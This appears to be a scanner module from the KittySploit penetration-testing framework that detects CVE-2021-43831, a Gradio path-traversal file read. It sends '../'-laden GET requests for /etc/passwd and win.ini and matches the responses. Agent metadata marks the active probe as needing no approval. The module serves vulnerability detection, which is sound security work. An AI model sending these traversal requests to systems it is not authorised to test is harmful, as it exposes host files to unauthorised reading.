#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Files on the host computer can be accessed from the Gradio interface."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Gradio < 2.5.0 - Arbitrary File Read Detection',
        'description': 'Files on the host computer can be accessed from the Gradio interface',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'lfi', 'gradio', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/gradio-app/gradio/security/advisories/GHSA-rhq2-3vr9-6mcr',
            'https://github.com/gradio-app/gradio/commit/41bd3645bdb616e1248b2167ca83636a2653f781',
        ],
        'cve': 'CVE-2021-43831',
    }

    def run(self):
        for path in ('/file/../../../../../../../../../../../../../../../../../../etc/passwd', '/file/../../../../../../../../../../../../../../../../../../windows/win.ini'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_regexes = ('root:.*:0:0:', '\\[(font|extension|file)s\\]',)
            if (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason="Gradio < 2.5.0 - Arbitrary File Read detected",
                    path=path,
                )
                return True
        return False

